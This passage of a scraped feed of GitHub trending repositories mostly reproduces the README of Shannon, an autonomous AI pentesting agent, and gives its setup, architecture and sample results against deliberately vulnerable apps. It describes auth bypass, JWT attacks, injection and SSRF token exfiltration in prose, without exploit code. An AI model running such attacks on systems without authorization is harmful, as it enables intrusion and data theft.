href=\"mailto:shannon@keygraph.io\">shannon@keygraph.io</a></p> \n<hr /> \n<p align=\"center\"> <b>Built with ❤️ by the Keygraph team</b><br /> <i>Making application security accessible to everyone</i> </p>",
        "source": "mshibanami.github.io",
        "published": "",
        "fetched_at": "2026-02-09T23:33:03.745518Z",
        "tags": [
          {
            "name": "transformation",
            "score": 3
          },
          {
            "name": "boundary_crossing",
            "score": 2
          },
          {
            "name": "visibility_gain",
            "score": 5
          },
          {
            "name": "scale_shift",
            "score": 12
          }
        ],
        "structural_score": 22,
        "timeliness_score": 1,
        "final_score": 11.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://github.com/KeygraphHQ/shannon",
        "title": "KeygraphHQ/shannon",
        "summary": "<p>Fully autonomous AI hacker to find actual exploits in your web apps. Shannon has achieved a 96.15% success rate on the hint-free, source-aware XBOW Benchmark.</p><hr /><blockquote> \n <p>[!NOTE] <strong><a href=\"https://github.com/KeygraphHQ/shannon/tree/main/xben-benchmark-results/README.md\">Shannon Lite achieves a 96.15% success rate on a hint-free, source-aware XBOW benchmark. →</a></strong></p> \n</blockquote> \n<div align=\"center\"> \n <p><a href=\"https://trendshift.io/repositories/15604\" target=\"_blank\"><img alt=\"KeygraphHQ%2Fshannon | Trendshift\" height=\"55\" src=\"https://trendshift.io/api/badge/repositories/15604\" style=\"width: 250px; height: 55px;\" width=\"250\" /></a></p> \n <img alt=\"Shannon Screen\" src=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/assets/shannon-screen.png?v=2\" width=\"100%\" /> \n <h1>Shannon is your fully autonomous AI pentester.</h1> \n <p>Shannon’s job is simple: break your web app before anyone else does. <br /> The Red Team to your vibe-coding Blue team. <br /> Every Claude (coder) deserves their Shannon.</p> \n <hr /> \n <p><a href=\"https://keygraph.io\">Website</a> • <a href=\"https://discord.gg/KAqzSHHpRt\">Discord</a></p> \n <hr /> \n</div> \n<h2>🎯 What is Shannon?</h2> \n<p>Shannon is an AI pentester that delivers actual exploits, not just alerts.</p> \n<p>Shannon's goal is to break your web app before someone else does. It autonomously hunts for attack vectors in your code, then uses its built-in browser to execute real exploits, such as injection attacks, and auth bypass, to prove the vulnerability is actually exploitable.</p> \n<p><strong>What Problem Does Shannon Solve?</strong></p> \n<p>Thanks to tools like Claude Code and Cursor, your team ships code non-stop. But your penetration test? That happens once a year. This creates a <em>massive</em> security gap. For the other 364 days, you could be unknowingly shipping vulnerabilities to production.</p> \n<p>Shannon closes this gap by acting as your on-demand whitebox pentester. It doesn't just find potential issues. It executes real exploits, providing concrete proof of vulnerabilities. This lets you ship with confidence, knowing every build can be secured.</p> \n<blockquote> \n <p>[!NOTE] <strong>From Autonomous Pentesting to Automated Compliance</strong></p> \n <p>Shannon is a core component of the <strong>Keygraph Security and Compliance Platform</strong>.</p> \n <p>While Shannon automates the critical task of penetration testing for your application, our broader platform automates your entire compliance journey—from evidence collection to audit readiness. We're building the \"Rippling for Cybersecurity,\" a single platform to manage your security posture and streamline compliance frameworks like SOC 2 and HIPAA.</p> \n <p>➡️ <strong><a href=\"https://keygraph.io\">Learn more about the Keygraph Platform</a></strong></p> \n</blockquote> \n<h2>🎬 See Shannon in Action</h2> \n<p><strong>Real Results</strong>: Shannon discovered 20+ critical vulnerabilities in OWASP Juice Shop, including complete auth bypass and database exfiltration. <a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/sample-reports/shannon-report-juice-shop.md\">See full report →</a></p> \n<p><img alt=\"Demo\" src=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/assets/shannon-action.gif\" /></p> \n<h2>✨ Features</h2> \n<ul> \n <li><strong>Fully Autonomous Operation</strong>: Launch the pentest with a single command. The AI handles everything from advanced 2FA/TOTP logins (including sign in with Google) and browser navigation to the final report with zero intervention.</li> \n <li><strong>Pentester-Grade Reports with Reproducible Exploits</strong>: Delivers a final report focused on proven, exploitable findings, complete with copy-and-paste Proof-of-Concepts to eliminate false positives and provide actionable results.</li> \n <li><strong>Critical OWASP Vulnerability Coverage</strong>: Currently identifies and validates the following critical vulnerabilities: Injection, XSS, SSRF, and Broken Authentication/Authorization, with more types in development.</li> \n <li><strong>Code-Aware Dynamic Testing</strong>: Analyzes your source code to intelligently guide its attack strategy, then performs live, browser and command line based exploits on the running application to confirm real-world risk.</li> \n <li><strong>Powered by Integrated Security Tools</strong>: Enhances its discovery phase by leveraging leading reconnaissance and testing tools—including <strong>Nmap, Subfinder, WhatWeb, and Schemathesis</strong>—for deep analysis of the target environment.</li> \n <li><strong>Parallel Processing for Faster Results</strong>: Get your report faster. The system parallelizes the most time-intensive phases, running analysis and exploitation for all vulnerability types concurrently.</li> \n</ul> \n<h2>📦 Product Line</h2> \n<p>Shannon is available in two editions:</p> \n<table> \n <thead> \n  <tr> \n   <th>Edition</th> \n   <th>License</th> \n   <th>Best For</th> \n  </tr> \n </thead> \n <tbody> \n  <tr> \n   <td><strong>Shannon Lite</strong></td> \n   <td>AGPL-3.0</td> \n   <td>Security teams, independent researchers, testing your own applications</td> \n  </tr> \n  <tr> \n   <td><strong>Shannon Pro</strong></td> \n   <td>Commercial</td> \n   <td>Enterprises requiring advanced features, CI/CD integration, and dedicated support</td> \n  </tr> \n </tbody> \n</table> \n<blockquote> \n <p><strong>This repository contains Shannon Lite,</strong> which utilizes our core autonomous AI pentesting framework. <strong>Shannon Pro</strong> enhances this foundation with an advanced, LLM-powered data flow analysis engine (inspired by the <a href=\"https://arxiv.org/abs/2402.10754\">LLMDFA paper</a>) for enterprise-grade code analysis and deeper vulnerability detection.</p> \n</blockquote> \n<blockquote> \n <p>[!IMPORTANT] <strong>White-box only.</strong> Shannon Lite is designed for <strong>white-box (source-available)</strong> application security testing.<br /> It expects access to your application's source code and repository layout.</p> \n</blockquote> \n<p><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/SHANNON-PRO.md\">See feature comparison</a></p> \n<h2>📑 Table of Contents</h2> \n<ul> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-what-is-shannon\">What is Shannon?</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-see-shannon-in-action\">See Shannon in Action</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-features\">Features</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-product-line\">Product Line</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-setup--usage-instructions\">Setup &amp; Usage Instructions</a> \n  <ul> \n   <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#prerequisites\">Prerequisites</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#quick-start\">Quick Start</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#monitoring-progress\">Monitoring Progress</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#stopping-shannon\">Stopping Shannon</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#usage-examples\">Usage Examples</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#configuration-optional\">Configuration (Optional)</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#experimental---unsupported-router-mode-alternative-providers\">[EXPERIMENTAL - UNSUPPORTED] Router Mode (Alternative Providers)</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#output-and-results\">Output and Results</a></li> \n  </ul> </li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-sample-reports\">Sample Reports</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#%EF%B8%8F-architecture\">Architecture</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-coverage-and-roadmap\">Coverage and Roadmap</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#%EF%B8%8F-disclaimers\">Disclaimers</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-license\">License</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-community--support\">Community &amp; Support</a></li> \n <li><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#-get-in-touch\">Get in Touch</a></li> \n</ul> \n<hr /> \n<h2>🚀 Setup &amp; Usage Instructions</h2> \n<h3>Prerequisites</h3> \n<ul> \n <li><strong>Docker</strong> - Container runtime (<a href=\"https://docs.docker.com/get-docker/\">Install Docker</a>)</li> \n <li><strong>AI Provider Credentials</strong> (choose one): \n  <ul> \n   <li><strong>Anthropic API key</strong> (recommended) - Get from <a href=\"https://console.anthropic.com\">Anthropic Console</a></li> \n   <li><strong>Claude Code OAuth token</strong></li> \n   <li><strong>[EXPERIMENTAL - UNSUPPORTED] Alternative providers via Router Mode</strong> - OpenAI or Google Gemini via OpenRouter (see <a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/#experimental---unsupported-router-mode-alternative-providers\">Router Mode</a>)</li> \n  </ul> </li> \n</ul> \n<h3>Quick Start</h3> \n<pre><code class=\"language-bash\"># 1. Clone Shannon\ngit clone https://github.com/KeygraphHQ/shannon.git\ncd shannon\n\n# 2. Configure credentials (choose one method)\n\n# Option A: Export environment variables\nexport ANTHROPIC_API_KEY=\"your-api-key\"              # or CLAUDE_CODE_OAUTH_TOKEN\nexport CLAUDE_CODE_MAX_OUTPUT_TOKENS=64000           # recommended\n\n# Option B: Create a .env file\ncat &gt; .env &lt;&lt; 'EOF'\nANTHROPIC_API_KEY=your-api-key\nCLAUDE_CODE_MAX_OUTPUT_TOKENS=64000\nEOF\n\n# 3. Run a pentest\n./shannon start URL=https://your-app.com REPO=/path/to/your/repo\n</code></pre> \n<p>Shannon will build the containers, start the workflow, and return a workflow ID. The pentest runs in the background.</p> \n<h3>Monitoring Progress</h3> \n<pre><code class=\"language-bash\"># View real-time worker logs\n./shannon logs\n\n# Query a specific workflow's progress\n./shannon query ID=shannon-1234567890\n\n# Open the Temporal Web UI for detailed monitoring\nopen http://localhost:8233\n</code></pre> \n<h3>Stopping Shannon</h3> \n<pre><code class=\"language-bash\"># Stop all containers (preserves workflow data)\n./shannon stop\n\n# Full cleanup (removes all data)\n./shannon stop CLEAN=true\n</code></pre> \n<h3>Usage Examples</h3> \n<pre><code class=\"language-bash\"># Basic pentest\n./shannon start URL=https://example.com REPO=/path/to/repo\n\n# With a configuration file\n./shannon start URL=https://example.com REPO=/path/to/repo CONFIG=./configs/my-config.yaml\n\n# Custom output directory\n./shannon start URL=https://example.com REPO=/path/to/repo OUTPUT=./my-reports\n</code></pre> \n<h3>Prepare Your Repository</h3> \n<p>Shannon is designed for <strong>web application security testing</strong> and expects all application code to be available in a single directory structure. This works well for:</p> \n<ul> \n <li><strong>Monorepos</strong> - Single repository containing all components</li> \n <li><strong>Consolidated setups</strong> - Multiple repositories organized in a shared folder</li> \n</ul> \n<p><strong>For monorepos:</strong></p> \n<pre><code class=\"language-bash\">git clone https://github.com/your-org/your-monorepo.git /path/to/your-app\n</code></pre> \n<p><strong>For multi-repository applications</strong> (e.g., separate frontend/backend):</p> \n<pre><code class=\"language-bash\">mkdir /path/to/your-app\ncd /path/to/your-app\ngit clone https://github.com/your-org/frontend.git\ngit clone https://github.com/your-org/backend.git\ngit clone https://github.com/your-org/api.git\n</code></pre> \n<h3>Platform-Specific Instructions</h3> \n<p><strong>For Linux (Native Docker):</strong></p> \n<p>You may need to run commands with <code>sudo</code> depending on your Docker setup. If you encounter permission issues with output files, ensure your user has access to the Docker socket.</p> \n<p><strong>For macOS:</strong></p> \n<p>Works out of the box with Docker Desktop installed.</p> \n<p><strong>Testing Local Applications:</strong></p> \n<p>Docker containers cannot reach <code>localhost</code> on your host machine. Use <code>host.docker.internal</code> in place of <code>localhost</code>:</p> \n<pre><code class=\"language-bash\">./shannon start URL=http://host.docker.internal:3000 REPO=/path/to/repo\n</code></pre> \n<h3>Configuration (Optional)</h3> \n<p>While you can run without a config file, creating one enables authenticated testing and customized analysis.</p> \n<h4>Create Configuration File</h4> \n<p>Copy and modify the example configuration:</p> \n<pre><code class=\"language-bash\">cp configs/example-config.yaml configs/my-app-config.yaml\n</code></pre> \n<h4>Basic Configuration Structure</h4> \n<pre><code class=\"language-yaml\">authentication:\n  login_type: form\n  login_url: \"https://your-app.com/login\"\n  credentials:\n    username: \"test@example.com\"\n    password: \"yourpassword\"\n    totp_secret: \"LB2E2RX7XFHSTGCK\"  # Optional for 2FA\n\n  login_flow:\n    - \"Type $username into the email field\"\n    - \"Type $password into the password field\"\n    - \"Click the 'Sign In' button\"\n\n  success_condition:\n    type: url_contains\n    value: \"/dashboard\"\n\nrules:\n  avoid:\n    - description: \"AI should avoid testing logout functionality\"\n      type: path\n      url_path: \"/logout\"\n\n  focus:\n    - description: \"AI should emphasize testing API endpoints\"\n      type: path\n      url_path: \"/api\"\n</code></pre> \n<h4>TOTP Setup for 2FA</h4> \n<p>If your application uses two-factor authentication, simply add the TOTP secret to your config file. The AI will automatically generate the required codes during testing.</p> \n<h3>[EXPERIMENTAL - UNSUPPORTED] Router Mode (Alternative Providers)</h3> \n<p>Shannon can experimentally route requests through alternative AI providers using claude-code-router. This mode is not officially supported and is intended primarily for:</p> \n<ul> \n <li><strong>Model experimentation</strong> — try Shannon with GPT-5.2 or Gemini 3–family models</li> \n</ul> \n<h4>Quick Setup</h4> \n<ol> \n <li>Add your provider API key to <code>.env</code>:</li> \n</ol> \n<pre><code class=\"language-bash\"># Choose one provider:\nOPENAI_API_KEY=sk-...\n# OR\nOPENROUTER_API_KEY=sk-or-...\n\n# Set default model:\nROUTER_DEFAULT=openai,gpt-5.2  # provider,model format\n</code></pre> \n<ol start=\"2\"> \n <li>Run with <code>ROUTER=true</code>:</li> \n</ol> \n<pre><code class=\"language-bash\">./shannon start URL=https://example.com REPO=/path/to/repo ROUTER=true\n</code></pre> \n<h4>Experimental Models</h4> \n<table> \n <thead> \n  <tr> \n   <th>Provider</th> \n   <th>Models</th> \n  </tr> \n </thead> \n <tbody> \n  <tr> \n   <td>OpenAI</td> \n   <td>gpt-5.2, gpt-5-mini</td> \n  </tr> \n  <tr> \n   <td>OpenRouter</td> \n   <td>google/gemini-3-flash-preview</td> \n  </tr> \n </tbody> \n</table> \n<h4>Disclaimer</h4> \n<p>This feature is experimental and unsupported. Output quality depends heavily on the model. Shannon is built on top of the Anthropic Agent SDK and is optimized and primarily tested with Anthropic Claude models. Alternative providers may produce inconsistent results (including failing early phases like Recon) depending on the model and routing setup.</p> \n<h3>Output and Results</h3> \n<p>All results are saved to <code>./audit-logs/{hostname}_{sessionId}/</code> by default. Use <code>--output &lt;path&gt;</code> to specify a custom directory.</p> \n<p>Output structure:</p> \n<pre><code>audit-logs/{hostname}_{sessionId}/\n├── session.json          # Metrics and session data\n├── agents/               # Per-agent execution logs\n├── prompts/              # Prompt snapshots for reproducibility\n└── deliverables/\n    └── comprehensive_security_assessment_report.md   # Final comprehensive security report\n</code></pre> \n<hr /> \n<h2>📊 Sample Reports</h2> \n<blockquote> \n <p><strong>Looking for quantitative benchmarks?</strong> <a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/xben-benchmark-results/README.md\">See full benchmark methodology and results →</a></p> \n</blockquote> \n<p>See Shannon's capabilities in action with penetration test results from industry-standard vulnerable applications:</p> \n<h4>🧃 <strong>OWASP Juice Shop</strong> • <a href=\"https://github.com/juice-shop/juice-shop\">GitHub</a></h4> \n<p><em>A notoriously insecure web application maintained by OWASP, designed to test a tool's ability to uncover a wide range of modern vulnerabilities.</em></p> \n<p><strong>Performance</strong>: Identified <strong>over 20 high-impact vulnerabilities</strong> across targeted OWASP categories in a single automated run.</p> \n<p><strong>Key Accomplishments</strong>:</p> \n<ul> \n <li><strong>Achieved complete authentication bypass</strong> and exfiltrated the entire user database via Injection attack</li> \n <li><strong>Executed a full privilege escalation</strong> by creating a new administrator account through a registration workflow bypass</li> \n <li><strong>Identified and exploited systemic authorization flaws (IDOR)</strong> to access and modify any user's private data and shopping cart</li> \n <li><strong>Discovered a Server-Side Request Forgery (SSRF)</strong> vulnerability, enabling internal network reconnaissance</li> \n</ul> \n<p>📄 <strong><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/sample-reports/shannon-report-juice-shop.md\">View Complete Report →</a></strong></p> \n<hr /> \n<h4>🔗 <strong>c{api}tal API</strong> • <a href=\"https://github.com/Checkmarx/capital\">GitHub</a></h4> \n<p><em>An intentionally vulnerable API from Checkmarx, designed to test a tool's ability to uncover the OWASP API Security Top 10.</em></p> \n<p><strong>Performance</strong>: Identified <strong>nearly 15 critical and high-severity vulnerabilities</strong>, leading to full application compromise.</p> \n<p><strong>Key Accomplishments</strong>:</p> \n<ul> \n <li><strong>Executed a root-level Injection attack</strong> by bypassing a denylist via command chaining in a hidden debug endpoint</li> \n <li><strong>Achieved complete authentication bypass</strong> by discovering and targeting a legacy, unpatched v1 API endpoint</li> \n <li><strong>Escalated a regular user to full administrator privileges</strong> by exploiting a Mass Assignment vulnerability in the user profile update function</li> \n <li><strong>Demonstrated high accuracy</strong> by correctly confirming the application's robust XSS defenses, reporting zero false positives</li> \n</ul> \n<p>📄 <strong><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/sample-reports/shannon-report-capital-api.md\">View Complete Report →</a></strong></p> \n<hr /> \n<h4>🚗 <strong>OWASP crAPI</strong> • <a href=\"https://github.com/OWASP/crAPI\">GitHub</a></h4> \n<p><em>A modern, intentionally vulnerable API from OWASP, designed to benchmark a tool's effectiveness against the OWASP API Security Top 10.</em></p> \n<p><strong>Performance</strong>: Identified <strong>over 15 critical and high-severity vulnerabilities</strong>, achieving full application compromise.</p> \n<p><strong>Key Accomplishments</strong>:</p> \n<ul> \n <li><strong>Bypassed authentication using multiple advanced JWT attacks</strong>, including Algorithm Confusion, alg:none, and weak key (kid) injection</li> \n <li><strong>Achieved full database compromise via Injection attacks</strong>, exfiltrating user credentials from the PostgreSQL database</li> \n <li><strong>Executed a critical Server-Side Request Forgery (SSRF) attack</strong> that successfully forwarded internal authentication tokens to an external service</li> \n <li><strong>Demonstrated high accuracy</strong> by correctly identifying the application's robust XSS defenses, reporting zero false positives</li> \n</ul> \n<p>📄 <strong><a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/sample-reports/shannon-report-crapi.md\">View Complete Report →</a></strong></p> \n<hr /> \n<p><em>These results demonstrate Shannon's ability to move beyond simple scanning, performing deep contextual exploitation with minimal false positives and actionable proof-of-concepts.</em></p> \n<hr /> \n<h2>🏗️ Architecture</h2> \n<p>Shannon emulates a human penetration tester's methodology using a sophisticated multi-agent architecture. It combines white-box source code analysis with black-box dynamic exploitation across four distinct phases:</p> \n<pre><code>                    ┌──────────────────────┐\n                    │    Reconnaissance    │\n                    └──────────┬───────────┘\n                               │\n                               ▼\n                    ┌──────────┴───────────┐\n                    │          │           │\n                    ▼          ▼           ▼\n        ┌─────────────────┐ ┌─────────────────┐ ┌─────────────────┐\n        │ Vuln Analysis   │ │ Vuln Analysis   │ │      ...        │\n        │  (Injection)    │ │     (XSS)       │ │                 │\n        └─────────┬───────┘ └─────────┬───────┘ └─────────┬───────┘\n                  │                   │                   │\n                  ▼                   ▼                   ▼\n        ┌─────────────────┐ ┌─────────────────┐ ┌─────────────────┐\n        │  Exploitation   │ │  Exploitation   │ │      ...        │\n        │  (Injection)    │ │     (XSS)       │ │                 │\n        └─────────┬───────┘ └─────────┬───────┘ └─────────┬───────┘\n                  │                   │                   │\n                  └─────────┬─────────┴───────────────────┘\n                            │\n                            ▼\n                    ┌──────────────────────┐\n                    │      Reporting       │\n                    └──────────────────────┘\n</code></pre> \n<h3>Architectural Overview</h3> \n<p>Shannon is engineered to emulate the methodology of a human penetration tester. It leverages Anthropic's Claude Agent SDK as its core reasoning engine, but its true strength lies in the sophisticated multi-agent architecture built around it. This architecture combines the deep context of <strong>white-box source code analysis</strong> with the real-world validation of <strong>black-box dynamic exploitation</strong>, managed by an orchestrator through four distinct phases to ensure a focus on minimal false positives and intelligent context management.</p> \n<hr /> \n<h4><strong>Phase 1: Reconnaissance</strong></h4> \n<p>The first phase builds a comprehensive map of the application's attack surface. Shannon analyzes the source code and integrates with tools like Nmap and Subfinder to understand the tech stack and infrastructure. Simultaneously, it performs live application exploration via browser automation to correlate code-level insights with real-world behavior, producing a detailed map of all entry points, API endpoints, and authentication mechanisms for the next phase.</p> \n<h4><strong>Phase 2: Vulnerability Analysis</strong></h4> \n<p>To maximize efficiency, this phase operates in parallel. Using the reconnaissance data, specialized agents for each OWASP category hunt for potential flaws in parallel. For vulnerabilities like Injection and SSRF, agents perform a structured data flow analysis, tracing user input to dangerous sinks. This phase produces a key deliverable: a list of <strong>hypothesized exploitable paths</strong> that are passed on for validation.</p> \n<h4><strong>Phase 3: Exploitation</strong></h4> \n<p>Continuing the parallel workflow to maintain speed, this phase is dedicated entirely to turning hypotheses into proof. Dedicated exploit agents receive the hypothesized paths and attempt to execute real-world attacks using browser automation, command-line tools, and custom scripts. This phase enforces a strict <strong>\"No Exploit, No Report\"</strong> policy: if a hypothesis cannot be successfully exploited to demonstrate impact, it is discarded as a false positive.</p> \n<h4><strong>Phase 4: Reporting</strong></h4> \n<p>The final phase compiles all validated findings into a professional, actionable report. An agent consolidates the reconnaissance data and the successful exploit evidence, cleaning up any noise or hallucinated artifacts. Only verified vulnerabilities are included, complete with <strong>reproducible, copy-and-paste Proof-of-Concepts</strong>, delivering a final pentest-grade report focused exclusively on proven risks.</p> \n<h2>📋 Coverage and Roadmap</h2> \n<p>For detailed information about Shannon's security testing coverage and development roadmap, see our <a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/COVERAGE.md\">Coverage and Roadmap</a> documentation.</p> \n<h2>⚠️ Disclaimers</h2> \n<h3>Important Usage Guidelines &amp; Disclaimers</h3> \n<p>Please review the following guidelines carefully before using Shannon (Lite). As a user, you are responsible for your actions and assume all liability.</p> \n<h4><strong>1. Potential for Mutative Effects &amp; Environment Selection</strong></h4> \n<p>This is not a passive scanner. The exploitation agents are designed to <strong>actively execute attacks</strong> to confirm vulnerabilities. This process can have mutative effects on the target application and its data.</p> \n<blockquote> \n <p>[!WARNING] <strong>⚠️ DO NOT run Shannon on production environments.</strong></p> \n <ul> \n  <li>It is intended exclusively for use on sandboxed, staging, or local development environments where data integrity is not a concern.</li> \n  <li>Potential mutative effects include, but are not limited to: creating new users, modifying or deleting data, compromising test accounts, and triggering unintended side effects from injection attacks.</li> \n </ul> \n</blockquote> \n<h4><strong>2. Legal &amp; Ethical Use</strong></h4> \n<p>Shannon is designed for legitimate security auditing purposes only.</p> \n<blockquote> \n <p>[!CAUTION] <strong>You must have explicit, written authorization</strong> from the owner of the target system before running Shannon.</p> \n <p>Unauthorized scanning and exploitation of systems you do not own is illegal and can be prosecuted under laws such as the Computer Fraud and Abuse Act (CFAA). Keygraph is not responsible for any misuse of Shannon.</p> \n</blockquote> \n<h4><strong>3. LLM &amp; Automation Caveats</strong></h4> \n<ul> \n <li><strong>Verification is Required</strong>: While significant engineering has gone into our \"proof-by-exploitation\" methodology to eliminate false positives, the underlying LLMs can still generate hallucinated or weakly-supported content in the final report. <strong>Human oversight is essential</strong> to validate the legitimacy and severity of all reported findings.</li> \n <li><strong>Comprehensiveness</strong>: The analysis in Shannon Lite may not be exhaustive due to the inherent limitations of LLM context windows. For a more comprehensive, graph-based analysis of your entire codebase, <strong>Shannon Pro</strong> leverages its advanced data flow analysis engine to ensure deeper and more thorough coverage.</li> \n</ul> \n<h4><strong>4. Scope of Analysis</strong></h4> \n<ul> \n <li><strong>Targeted Vulnerabilities</strong>: The current version of Shannon Lite specifically targets the following classes of <em>exploitable</em> vulnerabilities: \n  <ul> \n   <li>Broken Authentication &amp; Authorization</li> \n   <li>Injection</li> \n   <li>Cross-Site Scripting (XSS)</li> \n   <li>Server-Side Request Forgery (SSRF)</li> \n  </ul> </li> \n <li><strong>What Shannon Lite Does Not Cover</strong>: This list is not exhaustive of all potential security risks. Shannon Lite's \"proof-by-exploitation\" model means it will not report on issues it cannot actively exploit, such as vulnerable third-party libraries or insecure configurations. These types of deep static-analysis findings are a core focus of the advanced analysis engine in <strong>Shannon Pro</strong>.</li> \n</ul> \n<h4><strong>5. Cost &amp; Performance</strong></h4> \n<ul> \n <li><strong>Time</strong>: As of the current version, a full test run typically takes <strong>1 to 1.5 hours</strong> to complete.</li> \n <li><strong>Cost</strong>: Running the full test using Anthropic's Claude 4.5 Sonnet model may incur costs of approximately <strong>$50 USD</strong>. Costs vary based on model pricing and application complexity.</li> \n</ul> \n<h4><strong>6. Windows Antivirus False Positives</strong></h4> \n<p>Windows Defender may flag files in <code>xben-benchmark-results/</code> or <code>deliverables/</code> as malware. These are false positives caused by exploit code in the reports. Add an exclusion for the Shannon directory in Windows Defender, or use Docker/WSL2.</p> \n<h2>📜 License</h2> \n<p>Shannon Lite is released under the <a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/LICENSE\">GNU Affero General Public License v3.0 (AGPL-3.0)</a>.</p> \n<p>Shannon is open source (AGPL v3). This license allows you to:</p> \n<ul> \n <li>Use it freely for all internal security testing.</li> \n <li>Modify the code privately for internal use without sharing your changes.</li> \n</ul> \n<p>The AGPL's sharing requirements primarily apply to organizations offering Shannon as a public or managed service (such as a SaaS platform). In those specific cases, any modifications made to the core software must be open-sourced.</p> \n<h2>👥 Community &amp; Support</h2> \n<h3>Community Resources</h3> \n<p><strong>Contributing:</strong> At this time, we’re not accepting external code contributions (PRs).<br /> Issues are welcome for bug reports and feature requests.</p> \n<ul> \n <li>🐛 <strong>Report bugs</strong> via <a href=\"https://github.com/KeygraphHQ/shannon/issues\">GitHub Issues</a></li> \n <li>💡 <strong>Suggest features</strong> in <a href=\"https://github.com/KeygraphHQ/shannon/discussions\">Discussions</a></li> \n <li>💬 <strong>Join our <a href=\"https://discord.gg/KAqzSHHpRt\">Discord</a></strong> for real-time community support</li> \n</ul> \n<h3>Stay Connected</h3> \n<ul> \n <li>🐦 <strong>Twitter</strong>: <a href=\"https://twitter.com/KeygraphHQ\">@KeygraphHQ</a></li> \n <li>💼 <strong>LinkedIn</strong>: <a href=\"https://linkedin.com/company/keygraph\">Keygraph</a></li> \n <li>🌐 <strong>Website</strong>: <a href=\"https://keygraph.io\">keygraph.io</a></li> \n</ul> \n<h2>💬 Get in Touch</h2> \n<h3>Interested in Shannon Pro?</h3> \n<p>Shannon Pro is designed for organizations serious about application security. It offers enterprise-grade features, dedicated support, and seamless CI/CD integration, all powered by our most advanced LLM-based analysis engine. Find and fix complex vulnerabilities deep in your codebase before they ever reach production.</p> \n<p>For a detailed breakdown of features, technical differences, and enterprise use cases, see our <a href=\"https://raw.githubusercontent.com/KeygraphHQ/shannon/main/SHANNON-PRO.md\">complete comparison guide</a>.</p> \n<p align=\"center\"> <a href=\"https://docs.google.com/forms/d/e/1FAIpQLSf-cPZcWjlfBJ3TCT8AaWpf8ztsw3FaHzJE4urr55KdlQs6cQ/viewform?usp=header\" target=\"_blank\"> <img alt=\"Express Interest\" src=\"https://img.shields.io/badge/📋%20Express%20Interest%20in%20Shannon%20Pro-4285F4?style=for-the-badge&amp;logo=google&amp;logoColor=white\" /> </a> </p> \n<p><strong>Or contact us directly:</strong></p> \n<p>📧 <strong>Email</strong>: <a href=\"mailto:shannon@keygraph.io\">shannon@keygraph.io</a></p> \n<hr /> \n<p align=\"center\"> <b>Built with ❤️ by the Keygraph team</b><br /> <i>Making application security accessible to everyone</i> </p>",
        "source": "mshibanami.github.io",
        "published": "",
        "fetched_at": "2026-02-09T23:33:02.259087Z",
        "tags": [
          {
            "name": "transformation",
            "score": 3
          },
          {
            "name": "boundary_crossing",
            "score": 2
          },
          {
            "name": "visibility_gain",
            "score": 5
          },
          {
            "name": "scale_shift",
            "score": 12
          }
        ],
        "structural_score": 22,
        "timeliness_score": 1,
        "final_score": 7.3,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://github.com/google/langextract",
        "title": "google/langextract",
        "summary": "<p>A Python library for extracting structured information from unstructured text using LLMs with precise source grounding and interactive visualization.</p><hr /><p align=\"center\"> <a href=\"https://github.com/google/langextract\"> <img alt=\"LangExtract Logo\" src=\"https://raw.githubusercontent.com/google/langextract/main/docs/_static/logo.svg?sanitize=true\" width=\"128\" /> </a> </p> \n<h1>LangExtract</h1> \n<p><a href=\"https://pypi.org/project/langextract/\"><img alt=\"PyPI version\" src=\"https://img.shields.io/pypi/v/langextract.svg?sanitize=true\" /></a> <a href=\"https://github.com/google/langextract\"><img alt=\"GitHub stars\" src=\"https://img.shields.io/github/stars/google/langextract.svg?style=social&amp;label=Star\" /></a> <img alt=\"Tests\" src=\"https://github.com/google/langextract/actions/workflows/ci.yaml/badge.svg?sanitize=true\" /> <a href=\"https://doi.org/10.5281/zenodo.17015089\"><img alt=\"DOI\" src=\"https://zenodo.org/badge/DOI/10.5281/zenodo.17015089.svg?sanitize=true\" /></a></p> \n<h2>Table of Contents</h2> \n<ul> \n <li><a href=\"https://raw.githubusercontent.com/google/langextract/main/#introduction\">Introduction</a></li> \n <li><a href=\"https://raw.githubusercontent.com/google/langextract/main/#why-langextract\">Why LangExtract?</a></li> \n <li><a href=\"https://raw.githubusercontent.com/google/langextract/main/#quick-start\">Quick Start</a></li> \n <li><a 